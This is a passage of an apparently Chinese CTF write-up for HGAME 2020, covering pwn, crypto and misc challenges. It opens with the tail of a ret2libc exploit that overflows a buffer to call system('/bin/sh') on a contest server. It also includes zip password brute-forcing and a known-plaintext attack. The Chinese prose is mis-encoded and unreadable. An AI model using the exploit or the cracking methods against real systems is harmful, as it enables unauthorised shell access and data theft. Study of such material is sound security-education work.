class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">   </span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#å’Œä¸Šä¸€é¢˜ä¸€æ ·~</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line">    buf = <span class="string">'A'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)</span><br><span class="line">    payload+=p64(sh_addr)#system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">    payload+=p64(system_addr)#system()</span><br><span class="line">    payload+=p64(<span class="number">0</span>xdeadbeef)#è¿™é‡Œæ— æ‰€è°“äº†ï¼Œæˆ‘ä»¬éƒ½getshelläº†ï¼Œè¿”å›åœ°å€éšä¾¿å¡«äº†</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line"></span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20003"</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lnfantRSA"><a href="#lnfantRSA" class="headerlink" title="lnfantRSA"></a>lnfantRSA</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-8"><a href="#é¢˜ç›®ä»‹ç»ï¼š-8" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>çœŸ*ç­¾åˆ°é¢˜<br>p = 681782737450022065655472455411;<br>q = 675274897132088253519831953441;<br>e = 13;<br>c = pow(m,e,p*q) = 275698465082361070145173688411496311542172902608559859019841</p><h4 id="è§£é¢˜æ€è·¯ï¼š-8"><a href="#è§£é¢˜æ€è·¯ï¼š-8" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>çŸ¥é“æ‰€æœ‰çš„æ¡ä»¶äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç®—å‡ºç§é’¥då°±å¯ä»¥è§£å¯†äº†ï¼Œç§é’¥dæ˜¯å…¬é’¥åœ¨æ¨¡Ï†(n)ï¼Œå³æ˜¯è¿™é‡Œçš„Ï†(p<em>q)=(p-1)\</em>(q-1)</p><p>ç›´æ¥ç”¨gmpy2æ¨¡å—ä¸‹çš„invertå¯ä»¥æ±‚å‡ºç§é’¥æ¥ï¼Œd=gmpy2.invert(e,(p-1)*(q-1))</p><p>ç„¶åmï¼ˆå³flagï¼‰ä¸ºï¼šm=pow(c,d,p*q)</p><p>è¿™é‡Œè§£å¯†æ–¹ç¨‹çš„è¯æ˜ï¼š</p><p><img src="https://i.loli.net/2020/04/30/KAPMGRlaoXguwDx.png" alt="img"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 681782737450022065655472455411;</span><br><span class="line">q = 675274897132088253519831953441;</span><br><span class="line">e = 13;</span><br><span class="line">c = 275698465082361070145173688411496311542172902608559859019841</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">m = pow(c,int(d),p*q)</span><br><span class="line">print hex(m)[2:-1].decode('hex')</span><br></pre></td></tr></table></figure><p>flag:hgame{t3Xt6O0k_R5A!!!}</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-9"><a href="#é¢˜ç›®ä»‹ç»ï¼š-9" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Some basic modular arithmeticâ€¦</p><h4 id="è§£é¢˜æ€è·¯ï¼š-9"><a href="#è§£é¢˜æ€è·¯ï¼š-9" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>åŠ å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> A, B, flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">'hgame&#123;'</span>) <span class="keyword">and</span> flag.endswith(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = len(TABLE)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> flag:</span><br><span class="line">    i = TABLE.find(b)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        cipher += b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ii = (A*i + B) % MOD</span><br><span class="line">        cipher += TABLE[ii]</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>æ˜¯æ‹“å±•äº†å­—ç¬¦è¡¨çš„ä»¿å°„åŠ å¯† </p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“æ”¾å°„åŠ å¯†çš„å…¬å¼æ˜¯ï¼šcâ‰¡Ax+B ï¼ˆmod mï¼‰å…¶ä¸­ï¼Œxä¸ºæ˜æ–‡ï¼Œcä¸ºå¯†æ–‡ï¼Œmä¸ºæ¨¡æ•°ï¼Œè¿™é‡Œm=len(TABLE)</p><p>æ‰€ä»¥å¯¹åº”çš„è§£å¯†å…¬å¼å³ä¸ºï¼šxâ‰¡(c-B) * A ^-1^ (mod m)ï¼Œè¿™é‡Œï¼ŒA^-1^æ˜¯Aåœ¨æ¨¡mä¸‹çš„é€†å…ƒï¼Œï¼ˆå¦‚rsaä¸­dæ˜¯eåœ¨æ¨¡Ï†(n)ä¸‹çš„é€†å…ƒä¸€èˆ¬ï¼‰ï¼Œ</p><p>é¢˜ç›®ä¸­ï¼Œæˆ‘ä¸çŸ¥é“Aï¼ŒBï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©çˆ†ç ´A,Bçš„æ–¹æ³•ï¼Œç„¶ååœ¨æ‰€æœ‰ç­”æ¡ˆä¸­æ‰¾åŒ…å«å­—ç¬¦â€˜hgameâ€™çš„ç»“æœã€‚ï¼ˆå› ä¸ºçŸ¥é“flagä¸­å‰äº”ä¸ªå­—ç¬¦ä¸ºhgameï¼Œæ‰€ä»¥å…¶å®ä¹Ÿå¯ä»¥è§£æ–¹ç¨‹ï¼Œä½†æ˜¯å› ä¸ºTABLEæ¯”è¾ƒå°ï¼Œä¸ºäº†æŠ¢ä¸ªä¸€è¡€ï¼Œå°±ç›´æ¥çˆ†äº†ï¼Œç”šè‡³è„šæœ¬ä¹Ÿæ˜¯åœ¨åŸåŸºç¡€ä¸Šç›´æ¥æ”¹çš„ï¼‰</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = <span class="number">62</span></span><br><span class="line"><span class="keyword">for</span> A <span class="keyword">in</span> range(MOD):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> B <span class="keyword">in</span> range(MOD):</span><br><span class="line">        flag=<span class="string">""</span></span><br><span class="line">        cipher = <span class="string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> cipher:</span><br><span class="line">            i = TABLE.find(b)</span><br><span class="line">            <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">                flag += b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                try:</span><br><span class="line">                    ii = (i-B)*invert(A,MOD)%MOD</span><br><span class="line">                    flag += TABLE[ii]</span><br><span class="line">                except:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print flag</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>flagï¼šhgame{M4th_u5Ed_iN_cRYpt0}</p><h3 id="not-One-time"><a href="#not-One-time" class="headerlink" title="not_One_time"></a>not_One_time</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-10"><a href="#é¢˜ç›®ä»‹ç»ï¼š-10" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, butâ€¦<br>Just XOR ;P<br>nc 47.98.192.231 25001<br>hint: reduced key space</p><h4 id="è§£é¢˜æ€è·¯ï¼š-10"><a href="#è§£é¢˜æ€è·¯ï¼š-10" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¸€æ¬¡æ€§å¯†ç æœ¬æœ¬èº«æ— è§£ï¼Œç¨‹åºæ¼æ´åœ¨äºkeyçš„ç©ºé—´è¢«ç¼©å‡äº†ï¼Œå¯ä»¥å¤šæ¬¡è¿æ¥è·å–å¯†æ–‡æ–‡æœ¬ï¼Œæ­¤æ—¶ä¸€ç›´ä¸å˜çš„flagåè€Œå¯ä»¥çœ‹ä½œæ˜¯ç”¨æ¥åŠ å¯†çš„keyäº†ã€‚ç„¶åçˆ†ç ´flagï¼Œä½¿å¾—flagçš„æ¯ä¸€ä½èƒ½è§£å¯† <strong>å¯†æ–‡æ–‡æœ¬</strong> çš„<strong>æ¯ä¸€é¡¹</strong>çš„å¯¹åº”ä½ï¼Œè§£å¯†æˆåŠŸçš„åˆ¤æ–­æ¡ä»¶æ˜¯æ¢å¤å‡ºçš„æ˜æ–‡åœ¨ç»™å‡ºçš„keyçš„ç©ºé—´ä¸­ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><p> flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦è‚¯å®šæ˜¯hå§ï¼Œ </p><p>æ¯”å¦‚æˆ‘ä»¬è¿æ¥20æ¬¡ï¼Œè·å¾—20ç»„å¯†æ–‡ï¼Œ</p><p> hå’Œæ¯ä¸€ç»„çš„å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼‚æˆ–ï¼Œè‚¯å®šä¹Ÿæ˜¯ä¸€ä¸ªå¯è§å­—ç¬¦ï¼Œ å¹¶ä¸”20ç»„å¼‚æˆ–ä¸‹æ¥ï¼Œè·å¾—çš„å¯è§å­—ç¬¦è‚¯å®šä¹Ÿæ˜¯20ä¸ªï¼Œä¸ä¼šå°‘ä¸€ä¸ªã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦éå†æ‰€æœ‰çš„å¯†é’¥ç©ºé—´å†…çš„å…ƒç´ ï¼Œæ‰¾åˆ°æ»¡è¶³æ¡ä»¶ï¼ˆå³ï¼Œå’Œ20ç»„å¯†æ–‡çš„å¯¹åº”ä½å¼‚æˆ–ä¸‹æ¥èƒ½ç”Ÿæˆ20ä¸ªå¯è§å­—ç¬¦ï¼‰çš„å­—ç¬¦ï¼Œç»„åˆèµ·æ¥å³ä¸ºflag</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">import <span class="keyword">string</span>, binascii, base64</span><br><span class="line"></span><br><span class="line">def getex():</span><br><span class="line">    example=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        p=remote(<span class="string">'47.98.192.231'</span>,<span class="number">25001</span>)</span><br><span class="line">        example.append(base64.b64decode(p.recv()))</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">    <span class="literal">return</span> example</span><br><span class="line"></span><br><span class="line">ex=getex()<span class="comment">#è·å–50ç»„å¯†æ–‡</span></span><br><span class="line"></span><br><span class="line">tablekey=<span class="keyword">string</span>.ascii_letters+<span class="keyword">string</span>.digits</span><br><span class="line">tableflag=tablekey+<span class="string">'~!@#$%^&amp;*()_+-=`&#123;&#125;'</span>  <span class="comment">#flagçš„å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line">flag=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="built_in">len</span>(ex[<span class="number">0</span>])):</span><br><span class="line">    flag_may=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tableflag:</span><br><span class="line">        possible=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ex:</span><br><span class="line">            <span class="keyword">a</span> = chr(ord(i)^ord(j[index]))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">a</span> <span class="keyword">in</span> tablekey:<span class="comment">#å¦‚æœå¼‚æˆ–ç»“æœæ˜¯åœ¨å¯†é’¥ç©ºé—´é‡Œçš„è¯ï¼Œå°†ç»“æœæ”¾å…¥æ•°ç»„</span></span><br><span class="line">                possible.append(<span class="keyword">a</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(possi) == <span class="built_in">len</span>(ex):<span class="comment">#å¦‚æœæ•°ç»„é•¿åº¦ç­‰äºå¯†é’¥çš„ç»„æ•°ï¼ˆè¿™é‡Œçš„50ï¼‰</span></span><br><span class="line">            flag_may+=i<span class="comment">#è¯¥å­—ç¬¦ç¬¦åˆæ¡ä»¶ï¼Œæ”¾å…¥è¯¥ä½å€™é€‰ï¼ˆå› ä¸ºæœ‰å¯èƒ½ä¸€ä¸ªä½ç½®æœ‰å¤šä¸ªå­—ç¬¦æ»¡è¶³æ¡ä»¶ï¼Œå¯èƒ½éœ€è¦äºŒæ¬¡æ’é™¤ï¼‰</span></span><br><span class="line">    flag.append(flag_may) </span><br><span class="line">print flag<span class="comment">#çœ‹æ¯ä¸€ç»„æ˜¯å¦åªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå¤šè·‘å‡ éè„šæœ¬ï¼Œå–ä¸ªäº¤é›†å°±å¯ã€‚</span></span><br><span class="line">flag_string=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">flag_string+=i</span><br><span class="line">print flag_string</span><br></pre></td></tr></table></figure><p>hgame{r3us1nG+M3$5age-&amp;&amp;~rEduC3d_k3Y-5P4Ce}</p><h3 id="Recoder"><a href="#Recoder" class="headerlink" title="Recoder"></a>Recoder</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-11"><a href="#é¢˜ç›®ä»‹ç»ï¼š-11" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>We found a secret oracle and it looks like it will encrypt your inputâ€¦<br>nc 47.98.192.231 25002</p><h4 id="è§£é¢˜æ€è·¯ï¼š-11"><a href="#è§£é¢˜æ€è·¯ï¼š-11" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå†ç»è¿‡å¤šæ¬¡å°è¯•å¯ä»¥å‘ç°ï¼ŒæœåŠ¡å™¨ä¼šå°†ä½ çš„è¾“å…¥è¿›è¡Œç®€å•çš„ç½®æ¢ï¼Œ</p><p>ç„¶ååœ¨äº¤äº’åæ¬¡ä¹‹åä¼šç»™å‡ºç½®æ¢åçš„flagï¼Œé•¿åº¦ä¸º32ä½</p><p><img src="https://i.loli.net/2020/04/30/q7slBzN4kjL9uEA.png" alt="img"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¾“å…¥32ä½å­—ç¬¦ï¼Œè§‚å¯Ÿä»–ç½®æ¢åç»“æœï¼Œå¾—åˆ°æ˜ å°„å…³ç³»ï¼Œç„¶åæˆ‘ä»¬æ ¹æ®è¿™ä¸ªæ˜ å°„å…³ç³»ï¼Œå°†æœ€åç»™å‡ºçš„ç½®æ¢è¿‡åçš„flagç½®æ¢å›æ¥å³å¯ã€‚(æ³¨æ„ï¼Œä¸ºäº†è®©æˆ‘ä»¬çš„æ˜ å°„å…³ç³»ä¸ºä¸€ä¸€æ˜ å°„ï¼Œå³æ˜ å°„å…³ç³»ä¸ºåŒå°„å…³ç³»ï¼Œæˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯<strong>ä¸é‡å¤</strong>çš„å­—ç¬¦)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cin</span>=<span class="string">'qhaufsywetodiprgjYQvRWcklxnEbmzT'</span></span><br><span class="line"><span class="attribute">cout</span>=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTY'</span></span><br><span class="line"><span class="attribute">flagout</span>=<span class="string">'hL+jm5&#123;gae$IUtmp3&#125;iu!0m_PRAnTTe!'</span></span><br><span class="line">index=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cout :</span><br><span class="line">index.append(cin.<span class="builtin-name">find</span>(i))</span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(32):</span><br><span class="line">flag+=flagout[index[i]]</span><br><span class="line"><span class="builtin-name">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-12"><a href="#é¢˜ç›®ä»‹ç»ï¼š-12" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æ¬¢è¿å¤§å®¶å‚åŠ  HGAME 2020ï¼<br>æ¥æ¥æ¥ï¼Œç­¾ä¸ªåˆ°å§ï½<br>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t<br>æ³¨ï¼šè‹¥è§£é¢˜å¾—åˆ°çš„æ˜¯æ— <code>hgame{}</code>å­—æ ·çš„flagèŠ±æ‹¬å·å†…å†…å®¹ï¼Œè¯·æ‰‹åŠ¨æ·»åŠ <code>hgame{}</code>åæäº¤ã€‚<br>ã€Noticeã€‘è§£å‡ºæ¥çš„å­—æ¯å‡ä¸ºå¤§å†™</p><h4 id="è§£é¢˜æ€è·¯ï¼š-12"><a href="#è§£é¢˜æ€è·¯ï¼š-12" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>å°†é¢˜ç›®base64è§£ç åä¸ºï¼š.â€“ â€¦â€“ .-.. -.-. â€”â€“ â€“ . ..â€“.- - â€” ..â€“.- ..â€” â€”â€“ ..â€” â€”â€“ ..â€“.- â€¦. â€“. .- â€“ â€¦â€“</p><p>æ ¹æ®æç¤ºï¼Œæ‘©æ–¯å¯†ç è§£å¯†ï¼šW3LC0ME_TO_2020_HGAM3</p><p>flagï¼šhgame{W3LC0ME_TO_2020_HGAM3}</p><p>è¿™é‡Œæ¨èä¸€ä¸ªæ‘©æ–¯å¯†ç åœ¨çº¿è§£å¯†çš„æ¯”è¾ƒå¥½çš„ç½‘ç«™ï¼š <a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d" target="_blank" rel="noopener">http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d</a> ï¼Œå¯ä»¥è‡ªå®šä¹‰ åˆ†å‰²ç¬¦ï¼Œé•¿ç¬¦ï¼ŒçŸ­ç¬¦</p><h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-13"><a href="#é¢˜ç›®ä»‹ç»ï¼š-13" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æŸå¤©ï¼ŒObjectNotFoundç»™ä½ å‘æ¥äº†ä¸€ä¸ªå‹ç¼©åŒ…ã€‚<br>â€œç»™ä½ ä¸€å¼ æˆ‘çš„æ–°è€å©†çš„å£çº¸ï¼æ€æ ·ï¼Œå¥½çœ‹å—ï¼Ÿâ€<br>æ­£å½“ä½ ç–‘æƒ‘ä¸è§£çš„æ—¶å€™ï¼Œä½ çªç„¶æ³¨æ„åˆ°äº†å‹ç¼©æ–‡ä»¶çš„åå­—â€”â€”â€œSecretâ€ã€‚<br>è«éå…¶ä¸­æš—è—ç„æœºï¼Ÿ</p><h4 id="è§£é¢˜æ€è·¯ï¼š-13"><a href="#è§£é¢˜æ€è·¯ï¼š-13" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ‹¿åˆ°æ–‡ä»¶ï¼Œæ˜¯ä¸ªå›¾ç‰‡ï¼Œ</p><p>èƒ½å¤©ä½¿~</p><p>æ”¾å…¥010editorï¼Œctrl f æœç´¢hexå€¼ï¼š50 4b 03 04ï¼ˆè¿™æ˜¯å‹ç¼©åŒ…çš„æ–‡ä»¶å¤´ï¼‰å¯ä»¥çœ‹è§å›¾ç‰‡åº•éƒ¨æœ‰å‹ç¼©åŒ…ï¼Œ</p><p>æˆ‘ä»¬æ‰‹åŠ¨å°†zipåŒ…å¯¼å‡ºæ¥ï¼Œ</p><p>é¦–å…ˆé€‰ä¸­è‡ªè¿™ä¸ªæ–‡ä»¶å¤´å¾€åçš„æ‰€æœ‰å†…å®¹ï¼Œå³é”®-&gt;é€‰æ‹©-&gt;ä¿å­˜é€‰æ‹©</p><p>æ”¹æ–‡ä»¶åç¼€åä¸ºzip</p><p>æ‰“å¼€å‹ç¼©åŒ…</p><p>æç¤ºå‹ç¼©åŒ…å¯†ç æ˜¯ä¸ªIDï¼Œè¿™å¼ å›¾ç‰‡çš„IDï¼Ÿä¸çŸ¥é“ï¼Œç›´æ¥çˆ†6-8ä½æ•°å­—è¯•è¯•å…ˆï¼å¾—åˆ°</p><p>å¾—åˆ°ï¼š\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</p><p>çœ‹åˆ°æœ€åä¸€ä¸ª7dï¼Œâ€˜}â€™çš„asciiç çš„åå…­è¿›åˆ¶ï¼Œflagå‡ºæ¥äº†~</p><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flagï¼šhgame{Do_y0u_KnOW_uNiC0d3?}</p><p>å‘ƒï¼Œï¼Œæ˜¯unicodeä¹ˆåŸæ¥ã€‚ã€‚ã€‚ã€‚</p><h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-14"><a href="#é¢˜ç›®ä»‹ç»ï¼š-14" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ObjectNotFoundå‡ å¤©å‰éšæ‰‹ä»Cosmosç”µè„‘æ¡Œé¢ä¸Šå¤åˆ¶ä¸‹æ¥çš„æ–‡ä»¶ã€‚<br>å””ï¼Œå¥½åƒé‡Œé¢æœ‰ä»€ä¹ˆä¸å¾—äº†çš„ä¸œè¥¿ã€‚<br>ã€hint1ã€‘è¯·ä½¿ç”¨7zipã€‚å¦å¤–ï¼ŒåŠ å¯†çš„zipæ˜¯æ— æ³•è§£å‡ºå¯†ç çš„ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-14"><a href="#è§£é¢˜æ€è·¯ï¼š-14" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¸‹è½½å¾—åˆ°å‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†å¾—å‹ç¼©åŒ…å’Œä¸€ä¸ªæ–‡ä»¶ï¼ŒBacon.txt,</p><p>æ–‡æœ¬æ–‡ä»¶å¾—å†…å®¹æ˜¯ï¼š</p><p>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.</p><p>*Password in capital letters.</p><p>æ˜¯åŸ¹æ ¹å¯†ç å¾—ä¸€ç§å½¢å¼ï¼Œæ ¹æ®å¤§å°å†™æ¥è§£å¯†ï¼Œ</p><p>å…ˆå°†å¤§å†™å¾—å­—ç¬¦è½¬ä½aï¼Œå°å†™å¾—å­—æ¯è½¬ä¸ºbï¼Œ</p><p>bbabababaabbbbbbbaabbbaaababbbbbbaabbbaabbabbbaabababbbbaababbbaabaaabbbbab</p><p>ç„¶åæ‰¾ä¸€ä¸ª<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">åœ¨çº¿ç½‘ç«™è§£å¯†</a></p><p>è§£å¯†å¤±è´¥</p><p>é‚£å°±a,bäº’æ¢</p><p>aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba</p><p>å¾—åˆ°</p><p>FLAGHIDDENINDOC<br>flaghiddenindoc</p><p>ä¼šæ˜¯å‹ç¼©åŒ…å¾—å¯†ç ä¹ˆï¼Ÿ</p><p>æ‰“å¼€å‹ç¼©åŒ…</p><p>å¯ä»¥å‘ç°é‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªBacon.txt</p><p>åŠ ä¸Šæç¤ºè¯´ç”¨7zè¿›è¡Œå‹ç¼©ï¼Œåº”è¯¥æ˜¯æ˜æ–‡æ”»å‡»äº†å®é”¤äº†ã€‚</p><p>ç„¶åæ˜æ–‡æ”»å‡»è·å¾—æ— å¯†ç 